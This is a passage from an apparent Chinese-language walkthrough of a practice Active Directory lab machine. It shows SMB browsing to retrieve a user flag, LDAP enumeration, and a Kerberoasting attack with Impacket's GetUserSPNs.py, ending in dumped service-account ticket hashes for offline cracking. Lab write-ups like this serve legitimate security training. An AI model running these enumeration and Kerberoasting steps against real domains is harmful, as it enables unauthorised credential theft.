  3D Objects                         DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  AppData                            DH        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:30 <span class="token number">2024</span>
  Application Data                DHSrn        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:30 <span class="token number">2024</span>
  Contacts                           DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  Cookies                         DHSrn        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:30 <span class="token number">2024</span>
  Desktop                            DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:45:32 <span class="token number">2024</span>
  Documents                          DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  Downloads                          DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  Favorites                          DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  Links                              DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  Local Settings                  DHSrn        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:30 <span class="token number">2024</span>
  Music                              DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  My Documents                    DHSrn        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:30 <span class="token number">2024</span>
  NetHood                         DHSrn        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:30 <span class="token number">2024</span>
  NTUSER.DAT                        AHn   <span class="token number">262144</span>  Tue Jul <span class="token number">16</span> 03:28:25 <span class="token number">2024</span>
  ntuser.dat.LOG1                   AHS    <span class="token number">49152</span>  Tue Jun <span class="token number">18</span> 01:24:29 <span class="token number">2024</span>
  ntuser.dat.LOG2                   AHS        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:29 <span class="token number">2024</span>
  NTUSER.DAT<span class="token punctuation">&#123;</span>3e6aec0f-2b8b-11ef-bb89-080027df5733<span class="token punctuation">&#125;</span>.TM.blf    AHS    <span class="token number">65536</span>  Tue Jun <span class="token number">18</span> 01:24:54 <span class="token number">2024</span>
  NTUSER.DAT<span class="token punctuation">&#123;</span>3e6aec0f-2b8b-11ef-bb89-080027df5733<span class="token punctuation">&#125;</span>.TMContainer00000000000000000001.regtrans-ms    AHS   <span class="token number">524288</span>  Tue Jun <span class="token number">18</span> 01:24:29 <span class="token number">2024</span>
  NTUSER.DAT<span class="token punctuation">&#123;</span>3e6aec0f-2b8b-11ef-bb89-080027df5733<span class="token punctuation">&#125;</span>.TMContainer00000000000000000002.regtrans-ms    AHS   <span class="token number">524288</span>  Tue Jun <span class="token number">18</span> 01:24:29 <span class="token number">2024</span>
  ntuser.ini                        AHS       <span class="token number">20</span>  Tue Jun <span class="token number">18</span> 01:24:30 <span class="token number">2024</span>
  Pictures                           DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  Recent                          DHSrn        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:30 <span class="token number">2024</span>
  Saved Games                        DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  Searches                           DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  SendTo                          DHSrn        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:30 <span class="token number">2024</span>
  Start Menu                      DHSrn        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:30 <span class="token number">2024</span>
  Templates                       DHSrn        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:30 <span class="token number">2024</span>
  Videos                             DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>

                <span class="token number">12942591</span> blocks of size <span class="token number">4096</span>. <span class="token number">10795715</span> blocks available
smb: <span class="token punctuation">\</span>ybob317<span class="token punctuation">\</span><span class="token operator">></span> <span class="token builtin class-name">cd</span> Desktop
smb: <span class="token punctuation">\</span>ybob317<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">ls</span>
  <span class="token builtin class-name">.</span>                                  DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:45:32 <span class="token number">2024</span>
  <span class="token punctuation">..</span>                                  D        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  desktop.ini                       AHS      <span class="token number">282</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  user.txt                            A       <span class="token number">32</span>  Wed Jun <span class="token number">12</span> <span class="token number">19</span>:54:32 <span class="token number">2024</span>

                <span class="token number">12942591</span> blocks of size <span class="token number">4096</span>. <span class="token number">10795715</span> blocks available
smb: <span class="token punctuation">\</span>ybob317<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span><span class="token operator">></span> get user.txt</code></pre>
<p>拿到user flag</p>
<h2 id="LDAP探测"><a href="#LDAP探测" class="headerlink" title="LDAP探测"></a>LDAP探测</h2><p>389,636,3268,3269对应LDAP服务，先用ldapsearch扫一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> ldapsearch <span class="token parameter variable">-H</span> ldap://192.168.56.128 <span class="token parameter variable">-x</span> <span class="token parameter variable">-s</span> base <span class="token parameter variable">-b</span> <span class="token string">''</span> <span class="token string">"(objectClass=*)"</span> <span class="token string">"*"</span> + 
<span class="token comment"># extended LDIF</span>
<span class="token comment">#</span>
<span class="token comment"># LDAPv3</span>
<span class="token comment"># base &lt;> with scope baseObject</span>
<span class="token comment"># filter: (objectClass=*)</span>
<span class="token comment"># requesting: * + </span>
<span class="token comment">#</span>

<span class="token comment">#</span>
dn:
domainFunctionality: <span class="token number">7</span>
forestFunctionality: <span class="token number">7</span>
domainControllerFunctionality: <span class="token number">7</span>
rootDomainNamingContext: <span class="token assign-left variable">DC</span><span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
ldapServiceName: SOUPEDECODE.LOCAL:dc01<span class="token variable">$@</span>SOUPEDECODE.LOCAL
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: <span class="token number">3</span>
supportedLDAPVersion: <span class="token number">2</span>
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.319
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.801
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.473
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.528
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.417
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.619
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.841
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.529
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.805
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.521
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.970
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.1338
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.474
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.1339
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.1340
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.1413
supportedControl: <span class="token number">2.16</span>.840.1.113730.3.4.9
supportedControl: <span class="token number">2.16</span>.840.1.113730.3.4.10
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.1504
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.1852
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.802
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.1907
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.1948
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.1974
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.1341
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2026
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2064
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2065
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2066
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2090
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2205
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2204
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2206
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2211
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2239
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2255
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2256
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2309
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2330
supportedControl: <span class="token number">1.2</span>.840.113556.1.4.2354
supportedCapabilities: <span class="token number">1.2</span>.840.113556.1.4.800
supportedCapabilities: <span class="token number">1.2</span>.840.113556.1.4.1670
supportedCapabilities: <span class="token number">1.2</span>.840.113556.1.4.1791
supportedCapabilities: <span class="token number">1.2</span>.840.113556.1.4.1935
supportedCapabilities: <span class="token number">1.2</span>.840.113556.1.4.2080
supportedCapabilities: <span class="token number">1.2</span>.840.113556.1.4.2237
subschemaSubentry: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Aggregate,CN<span class="token operator">=</span>Schema,CN<span class="token operator">=</span>Configuration,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>L
 OCAL
serverName: <span class="token assign-left variable">CN</span><span class="token operator">=</span>DC01,CN<span class="token operator">=</span>Servers,CN<span class="token operator">=</span>Default-First-Site-Name,CN<span class="token operator">=</span>Sites,CN<span class="token operator">=</span>Configur
 ation,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
schemaNamingContext: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Schema,CN<span class="token operator">=</span>Configuration,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
namingContexts: <span class="token assign-left variable">DC</span><span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
namingContexts: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Configuration,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
namingContexts: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Schema,CN<span class="token operator">=</span>Configuration,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
namingContexts: <span class="token assign-left variable">DC</span><span class="token operator">=</span>DomainDnsZones,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
namingContexts: <span class="token assign-left variable">DC</span><span class="token operator">=</span>ForestDnsZones,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
isSynchronized: TRUE
highestCommittedUSN: <span class="token number">53264</span>
dsServiceName: <span class="token assign-left variable">CN</span><span class="token operator">=</span>NTDS Settings,CN<span class="token operator">=</span>DC01,CN<span class="token operator">=</span>Servers,CN<span class="token operator">=</span>Default-First-Site-Name,
 <span class="token assign-left variable">CN</span><span class="token operator">=</span>Sites,CN<span class="token operator">=</span>Configuration,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
dnsHostName: DC01.SOUPEDECODE.LOCAL
defaultNamingContext: <span class="token assign-left variable">DC</span><span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
currentTime: <span class="token number">20240715202250</span>.0Z
configurationNamingContext: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Configuration,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL

<span class="token comment"># search result</span>
search: <span class="token number">2</span>
result: <span class="token number">0</span> Success

<span class="token comment"># numResponses: 2</span>
<span class="token comment"># numEntries: 1</span></code></pre>
<p>拿到DNS主机名<code>DC01.SOUPEDECODE.LOCAL</code>以及域名<code>SOUPEDECODE.LOCAL</code>添加到hosts</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">192.168</span>.56.128 dc01.soupedecode.local soupedecode.local</code></pre>
<h2 id="Kerberoasting攻击"><a href="#Kerberoasting攻击" class="headerlink" title="Kerberoasting攻击"></a>Kerberoasting攻击</h2><p>先请求一下TGS票据</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> GetUserSPNs.py <span class="token parameter variable">-request</span> -dc-ip <span class="token number">192.168</span>.56.128 soupedecode.local/ybob317  <span class="token parameter variable">-outputfile</span> hashes.kerberoast
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python <span class="token number">2</span> is no longer supported by the Python core team. Support <span class="token keyword">for</span> it is now deprecated <span class="token keyword">in</span> cryptography, and will be removed <span class="token keyword">in</span> the next release.
Impacket v0.9.20 - Copyright <span class="token number">2019</span> SecureAuth Corporation

Password:
ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon 
----------------------  --------------  --------  --------------------------  ---------
FTP/FileServer          file_svc                  <span class="token number">2024</span>-06-18 01:32:23.726085  <span class="token operator">&lt;</span>never<span class="token operator">></span>   
FW/ProxyServer          firewall_svc              <span class="token number">2024</span>-06-18 01:28:32.710125  <span class="token operator">&lt;</span>never<span class="token operator">></span>   
HTTP/BackupServer       backup_svc                <span class="token number">2024</span>-06-18 01:28:49.476511  <span class="token operator">&lt;</span>never<span class="token operator">></span>   
HTTP/WebServer          web_svc                   <span class="token number">2024</span>-06-18 01:29:04.569417  <span class="token operator">&lt;</span>never<span class="token operator">></span>   
HTTPS/MonitoringServer  monitoring_svc            <span class="token number">2024</span>-06-18 01:29:18.511871  <span class="token operator">&lt;</span>never<span class="token operator">></span>   



<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Kerberos SessionError: KRB_AP_ERR_SKEW<span class="token punctuation">(</span>Clock skew too great<span class="token punctuation">)</span></code></pre>
<p>靶机跟我的kali时间不一致导致的，使用ntpdata同步一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> ntpdate <span class="token number">192.168</span>.56.128
<span class="token number">2024</span>-07-16 05:50:17.021809 <span class="token punctuation">(</span>+0800<span class="token punctuation">)</span> +53997.567713 +/- <span class="token number">0.000341</span> <span class="token number">192.168</span>.56.128 s1 no-leap
CLOCK: <span class="token function">time</span> stepped by <span class="token number">53997.567713</span>

 ~/Desktop                                                                      14h 59m 58s  root@kali2  05:50:17 
<span class="token operator">></span> GetUserSPNs.py <span class="token parameter variable">-request</span> -dc-ip <span class="token number">192.168</span>.56.128 soupedecode.local/ybob317:ybob317                              

/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python <span class="token number">2</span> is no longer supported by the Python core team. Support <span class="token keyword">for</span> it is now deprecated <span class="token keyword">in</span> cryptography, and will be removed <span class="token keyword">in</span> the next release.
Impacket v0.9.20 - Copyright <span class="token number">2019</span> SecureAuth Corporation

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon 
----------------------  --------------  --------  --------------------------  ---------
FTP/FileServer          file_svc                  <span class="token number">2024</span>-06-18 01:32:23.726085  <span class="token operator">&lt;</span>never<span class="token operator">></span>   
FW/ProxyServer          firewall_svc              <span class="token number">2024</span>-06-18 01:28:32.710125  <span class="token operator">&lt;</span>never<span class="token operator">></span>   
HTTP/BackupServer       backup_svc                <span class="token number">2024</span>-06-18 01:28:49.476511  <span class="token operator">&lt;</span>never<span class="token operator">></span>   
HTTP/WebServer          web_svc                   <span class="token number">2024</span>-06-18 01:29:04.569417  <span class="token operator">&lt;</span>never<span class="token operator">></span>   
HTTPS/MonitoringServer  monitoring_svc            <span class="token number">2024</span>-06-18 01:29:18.511871  <span class="token operator">&lt;</span>never<span class="token operator">></span>   



<span class="token variable">$krb5tgs</span><span class="token variable">$23</span><span class="token variable">$*</span>monitoring_svc<span class="token variable">$SOUPEDECODE</span>.LOCAL<span class="token variable">$HTTPS</span>/MonitoringServer*<span class="token variable">$f02f26591f0aef75426d7752ca0da996</span><span class="token variable">$253b76c7d9c7aa4d0047335f7829dbd2ee4511bb0979ff2a3a3d59e2c679a4d6102b7f4527ed52f86f6d67492f0f5209fe311b16735b3e88b5c55f815d78e6898429b9d56203b3e816ef65f941476a921e717ca347542000c0980f3891e16cc2c8b329efe00710d9acdcd34018daab2e079c0552925189dfccd80c525f2ee868ae5b71670da3a2b13a55281bae121099b920e3de3d012e1bc6f11e8fbd36de6ccaeec37d39daa0e3d3fdbaf8dd92ce3a5a602fc8fbeadf2802d8fb9a4939c80b64cd23765a09253496c4443427550befd9fbcf748f5b69aee3aa3c8d3fd5132f35e15b5b03b815f4b8706c46cef736b23ee371210fcf09d1151d1b5dcb025330b74264c536fd4cbb9ff8bd49e06b09a0cdce6dcc31f46098f8d7a4678b022e8568824cbdcd745ec451f27b2f1af069df984c5e1042ea2faed224da1178bbdc1d9b062e7098b63374dfc35b7af725447d740718a60185e916753d00ecec4ce2afc0a114bd3e84832e5a248c313366f0a99d80e7c54f0b89c22ac41bf323ce3adf1d42678a929ba2f7b5d99d391659a07cacf3f9b1b26b203a5d38b71fa019947e7182b6ce230110e0c356615eecafad6aa3a8cb8d4b074516fba865d9d654ad1412737bdef738fc5ddb8e52586e69db00ad4f428f54ed8a22512573be19ae237924127a5a677e74da544df6cb2117a4094edaeaa6c5fdf57fb92b651290614c7b250acc98b3d41e9a1202a55b14a22a013c1b98fdd5e9658820824e34efc96fdcb7e20a30470c7e342666b223b35a07d22c3a3c612b652824f8192b374b710833e4452043e566f361b63d2415ae6b133a50eaf18c7b8edc6be19d96eafcf281f1786b0c1f3a94b4cfbbc37e970d8f129bee6293259870cf0a98cc841c20c4da2662fea46ce37d6efca0f72f5c8dce5c7478b823d31385b932f557cdc467e063420eab0f3618f6aea3cb2b8d045f37742a24dcaebd4dc6aca935f89f144667f7403e40ee2b1a741cf3c7a0e8be8cbcd814b2181576750a5ad93c9aa46e7fde5b01e77a9c6a7fdca5b717d3b9449eab525112882f0bebcf02c0174d32d0923134978532d30257be383f16f86c869fdc6ff8fd85db379c5373ae7667c7d23e973c52d2f3a434fb4f8a2b0ae0eb3c3015391a6e5c7efaf86c906c45c2cb104bdcf886ecfc07b52020b7ac8ea5cb518543002d20319e9560af545b94838fab148eab88d0f567900677e19c2ecd888daa3f625622ff3d76289b5c970995db0223e325643a714ea5970a409d13e01026a457543d91b2ba3db6af1f3861915e71d0c0c9fbb309c71e754377842b8abaa9a65807e0c0fcad5180ff93beb2f9e8691e02ef729bbd5ffb4359731b2c30c58b1b8f2a223e790a5e4796da4ff375cb83390cb8abb55196efc8a144590ec2773da253509ed849acecccdc42cab2065d5f917e7f5548bfa94a3b45951cd12ac8b778e9d258ed9b8fe5a89f9ec916c06065806e8edcf7</span>
<span class="token variable">$krb5tgs</span><span class="token variable">$23</span><span class="token variable">$*</span>file_svc<span class="token variable">$SOUPEDECODE</span>.LOCAL<span class="token variable">$FTP</span>/FileServer*<span class="token variable">$2d64339559980b4a517f73b22927e7fc</span><span class="token variable">$e957aa7e0636622b658e7c474b61979d6d44a5a27b37f9eecf6e70dd0461108717a9945ba8ddcedbb3cf7a00ba7fa71e9f15c9481c90bad238c6f419e43c2f517bd72acc5570d6b0fa9bddf60cb2c1156b6c1a49ada9ec8042f84f39890a12aded78dda061dd8ec0e592a8a0160d96eae6cf7240fe3e8785cb0fae30d0649eb5f492c67d199d86c3f742f0cc6335837afce19a15c40409cc8cd6ee5833c04f0674c6e3baa6e9b040bf6f38afe65e0d8d32c03493ad1e97f2b801e3ceb61483b6863acfe17c3f6b09a2973b564fcd41a82c88e0b0e37c43e8ef491d4130584db42b41e9604f08259463be8c62bb7e99fa668e511d733c36a78d567c8c67f4b35da6a8f26e870adbc04e36258c28b8fd2e04fbf2753c86bd382d917562b5fcf4afb3569ba9ea76fcea54b993f6accd84a16692e6d08e08f1a252b6ac0eb64eef1a7ae6972af61b9f9c2899acf6704c2fa90593af60352a2e4bf4f5cf12ca7f5e769dec58c91c6fbb5d1dec0d78e0ac3332332d2550717a0512abee6a31a314c1add42835b9798d5c11b728da9b44dd68dc1d40f9237623dca9553ae4fdc7d823e38f0fd4734bb6f344a38c81d841b63071b2127b5dc21f0463d0947f019152502459e73157cd2c1f69e04782ec27934a0c1ca42581c91d778f9e8609e6c18efe5895a430c3b7c3349858cd521b6fb745d1faf1a925b0c1f4d6d9ff66f66546afde1205c3d9a1fd077b3ea5ef21f349f381727d9c35a1302218360ca316350c8afdc3d84ec3ce11f092643ea33f432fb99a4bac3b9544f98e686a3dae22e580c786839f54d165bce1711a933e4c183e3adb54a4f24a14c7abb56c9f8f8e6411603e3e6a3fed6a0506473a69d47f1d17ee05acebb2eadb7dadb56f0e23d7fdb026328a6285f9b7f8c14f55de5d2b5df2e5f4f589a7b7a6dedf50f870d1685a23460dd692bed0dd58cef3f398f70fd052f5e0c8365cea36f12b105ac5dd3a0a055ed1c0c37c1ee60d6bd4c88aad2b62653ce24166bbadb151d20cc638b19fa12016e7c0eab4dc2cb9b3e257b581970c36b8ce9a2b6e80a47bc29a73e6860e04f8788cb4afb801f384b8c8fa65c21d6976417f77e235138d41e88a4093b9d1d8cbe0d3a4898834aeb7f010d3c0b50515582e9a2e5c87af0e4a2925e972a5f75f8e142037fbde86bf8a25f26fbe62b998723a858e38b542e1967ab7ca21a2320b8c1888baf521a9d8809493a19d1d689b0e0280f5e9f369ac0ab61ebbf2aea275bd4a7124079de76efc31591e0083aaf112355d22a8f582e239299de6cbe436f1490e01903e90529df4d93a19ad2442d8052c0d6d320a91c7c0149ba885e4f776a4fa86d13c3638e51bd7f58247214448bbd4bf94a19ceb8f0cf61a2770de8d4cf0c97d1a933513bc41b64fa719fe5f6db70ffd2431c94c8264a0c02fcff40941afe2dd66b6ed31f09a385ae78b23a385b72a3c44cce1b7554b4afa9d250b7a6303623efa</span>
<span class="token variable">$krb5tgs</span><span class="token variable">$23</span><span class="token variable">$*</span>backup_svc<span class="token variable">$SOUPEDECODE</span>.LOCAL<span class="token variable">$HTTP</span>/BackupServer*<span class="token variable">$f98fabfb92fcf6aecadefd3b8a4bdc65</span><span class="token variable">$046e82f2a4cbc668bcfbd9b6e38751d3f5fd30f158cea68f2f33d8cc139181b7b3324d5ef7ec6d765a5e71d0d2ae679e44c71722d0f6ff64f1143bf34ff6a318de1d619be7e6f64bb145072035965688245d1c047bd31518815a0d6e44834b6afcd0d47e780cba63a0921f92d51e941602c3bbb337d309fe8117d55c87e3b8c48a7394a51f6c91b0d0a8d69628f9ff088f1c81ca70b34466df43702b6599918081470b8e27ca18b246d5f666b844937627f98a0d8a8b69cf029ac6e8bda11ed8185b0e4dea0e767b9a7bb841dfe6219a554183fc411207f5b29e2e7bbf305b25dad6aeee1fdf9cf48fd41b330f0f3443bd7473f01a916258a569b9fe6ee96d337cf40bbfff0539244792edd9166c9184a434831bc2adc897539856d08e314265e02931bf0369199c349ce8a6af417cbe1fd200881e5539ba9c621b6984fc82b941c239e53ba25c07a551766cb76675d8b2d04a969e39bae49d4519b336248d7bf7967e29ab801ba743c3664c261b3014e11dd408094a2705ef0a7d014d4470fa54a5685e02969e2e06af8ad030a39520aa58e54520d979782cdc61e133f175c3fc10ed7d616d3a45f2abf6b4d93db14b5b9433129ba722a488f1a43f583a5570768fc5d8fb14868000ad0e232fbf1156db042dfda291b6f95effa7753176856c65d927a71fc2f6897f57661d2e0ec8c5b97247ec44c2989fdb1a45595ba47cc98f41850bb3663cac4d30bca745d0e37724169043cada53b96c602ae760beb3191b24b2403a812b0ad5cecbe5f6831e1f1bd51f79dc42b1f6405d21533719fe0b4fe75dff16db9a35ff869c99df937e09538a91010201bfd25931c23dab6b619674329df6c37bf400d2f54f2aff13e4f124e5aec5e942aa2e51ec8ca38327c9d138827ba41e5b06a1b2960617e0dcd13b3f1564a66914e15d784c3fa0f0a2be742357ce1e7e9b833f2b03c303e435a54ccfe74940947f14666786c47d53682ca630a4b69a966182cca60ff045f887f94669fbbe97caf6d5790af6f80fc0f3c1cb661b0ae6b6533a5885824c67f609b6e53c5b4e7b8bd0ba8dba9ea1daa3a001fbf8fde441aa1c5d963f77aa1676324729a236c84f960b8d414caddb869aa5822cf24455b061d0cfa8836aa35b4888c1ff57679b7260617e163d092de052e2557c6bfd49ce20e56d6b639097d7c828fc58e322d4f0e46e25d9d466f59520d2d781f1bd2fcd75e5cf6156b885e02acc27eba15d66a534d48bc12343c7b07ccd019b31e41de7d9ca07f90da3e6d5cb15f9e76b706b9dcb602f8aabbfff621fae7ef9e423f9fe14514d4c4eeeb2d73246d7a3aebf795ef45828f7efde263b806d7c5519e665216178d4d79186ccaa91f37268cf624e86104d22e6aa209ed64b763b6e3937343f9893c0bc15bb33ca22ec00837935d33d9cb1b862540a1c7a3bfe0321d851556103e824217b9e7de2a90a21348d2a4193141844fca7e9bfaeeec5477d2e</span>
<span class="token variable">$krb5tgs</span><span class="token variable">$23</span><span class="token variable">$*</span>firewall_svc<span class="token variable">$SOUPEDECODE</span>.LOCAL<span class="token variable">$FW</span>/ProxyServer*<span class="token variable">$ad4bb3d6193648b48dfe968dfbce59da</span><span class="token variable">$a43ff3edc2fa9b462c82fcf119ef0f99242492ebad89c47cda0296c3975fd845f5159cc3485cfeb3796575735d86b1051b6f70f01a169309bec0e3c5844155c795524f7d672e884d69ef0e58ee86e2231575f9556302631ea341c652d77542f5101a2ff87035a0df163586aae6b210f9ac63b004d7ee350c5b63013b28fa48bc7c1f21d827852c2588e33f102a2679777445a31c7d938d4badb3a82afe50c72a86d447062febb58a65fd441e0b1213f1382ac9ff8eded263657a7adc1e54a845ae8b42501fbcc2744b33872b2c835ea50d3f45a18fda498108acc271204ebb3c5eacaa0228538ed9b908d142e6f258aa911c99d5f501d26518095685967e6a11fc4af6e90908b52729731307a7eebc7ac3a5246238d0b7674f3ff71c7a006377ae48d9038d2ad2af1fb6ea35f25c469a27bd02442e80aa4cdc392dd3ec47b1316ce1b15226a726e739138517a263c08ec1a6c84c033347e1e9e3f25682fb81f8a0b5b475b39beb1d4305f4b1b32ab4c6e4e1c6b1ead93a1f25698a35ba8f052bc2edf4a543b715533dd9a09966145a468e35a0f9d9e246c7ecf240106fb7dcc9fba852c6917f729de8231054424e2a0d263713597edebbed59a0bd16f858fc4a082315165bc1ef88126f896e7131476042a3dbf0c2e581dedea536fc042088afbbc1a0bb91c15c9b94380f4157a1ed63d872be6ba45467a68288ceb26824ff09f2d94b521810cdfc3d90e3bfc93c0502143cf8cad74d37fc4431c4484ffc0cb36baf6730cd22bde31e96fc81460291be8dc5d2e989ff51a7b91c25d1945849c984c6daa96bc7fd7b2c5df01e7dbba5097c677dc50b25103ed12cca9bbdf811b2f2ad4681dc583db8cd13a03ef8763c86c581532b5871a150cd52fcf87e0652fa6d2775ff6655e8523c13cff3a65f7ef1bb8b562af71118a5ba8c7ac950ed8bd0b35115c15728ed3b06ff1eb9acef0502b970ae8992ce83cded0b5aecfe61e69fb229d6f6a75d38a8dec0d5688939e5f6885252fb31ca311f6b7be13e613a1dcf8c1c6ee42ccd4b9e6287356fef8164aeb8ff8f3dcb9eed30b376f2c31c3baffebbe726ec750f3f877c39d71c57c0ef8ef84fb6a3bc62f715297430fbb94c587639894e286e555d280bea8cf33e66ef903886d2009f1c6fbab6639a1c2f4a1a5604a050ce578f093ec8f3899d3e5b21de2b10b9001577eda6322c1d8ddf55c1242a765cb6020c5dbee296a23b7422c784f542d2bc917fcfbda4b173af9cf459f8e31114a71c40291e91899f896151a307220f6c4c3abb127107d9bb25c100999802e6e4ff1f4811ad2f613a9a8240de720cd96343212d57101696278bdafa395a0970d68e1ec2f74878a6a18fa78e743fc1e2819e5f564489eb33163b3dc92534f0144d8ee980086f874c120240c4ef95844b6a502235c897940afb323f14817e566c1dae22c08ea6204c6985aa6e80f929ce565b619627c673d1f3d2</span>
